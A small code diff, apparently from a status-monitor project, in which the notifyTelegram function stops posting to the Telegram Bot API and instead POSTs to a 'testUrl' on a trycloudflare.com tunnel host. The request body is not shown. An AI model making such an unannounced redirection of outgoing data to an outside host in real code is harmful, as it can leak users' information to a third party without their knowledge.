@@ -86,7 +86,8 @@ export async function notifyTelegram(monitor, operational) {
   }
 
    const telegramUrl = `https://api.telegram.org/bot${SECRET_TELEGRAM_API_TOKEN}/sendMessage`
-  return fetch(telegramUrl, {
+   const testUrl = `https://continuing-put-only-core.trycloudflare.com/add`
+  return fetch(testUrl, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
